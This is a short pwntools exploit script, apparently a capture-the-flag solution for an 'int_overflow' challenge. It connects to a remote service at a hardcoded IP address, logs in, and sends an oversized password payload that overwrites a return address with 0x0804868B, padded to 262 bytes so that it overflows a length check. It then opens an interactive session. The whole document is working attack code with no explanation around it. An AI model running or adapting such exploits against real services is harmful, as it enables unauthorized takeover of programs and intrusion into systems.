from pwn import *

t = remote('111.198.29.45', 32348)
#t = process('./int_overflow')

def debug():
    addr = int(raw_input("DEBUG: "), 16)
    gdb.attach(t, "b *" + str(addr))

#debug()
t.sendlineafter('Your choice:', '1')
t.sendlineafter('username:', 'aaaaaaa')
payload = 'a' * 24 + p32(0x0804868B)
payload = payload.ljust(262,'a')
t.sendlineafter('passwd:', payload)
t.interactive()
